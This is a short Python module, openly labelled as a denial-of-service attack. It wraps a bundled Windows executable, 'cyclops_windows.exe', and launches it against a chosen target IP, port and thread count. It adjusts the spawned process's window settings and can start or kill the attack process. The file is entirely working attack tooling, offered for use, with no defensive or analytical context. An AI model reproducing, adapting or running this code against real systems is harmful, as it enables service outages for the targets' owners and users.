# Date: 09/25/2018
# Author: Pure-L0G1C
# Description: Dos Attack

import platform
import subprocess


class Cyclops:

    versions = {
        'windows': 'cyclops_windows.exe',
    }

    os_name = platform.system().lower()

    def __init__(self, ip, port, threads):
        self.ip = ip
        self.port = port
        self.threads = threads

        self.proc = None
        self.cyclops = None

        if self.os_name in self.versions:
            self.cyclops = self.versions[self.os_name]

    def start(self):
        if not self.cyclops:
            return

        cmd = "{} {} {} {}".format(
            self.cyclops, self.ip,
            self.port, self.threads
        )

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        self.proc = subprocess.Popen(cmd.split(), startupinfo=startupinfo)

    def stop(self):
        if self.proc:
            self.proc.kill()
            self.proc = None
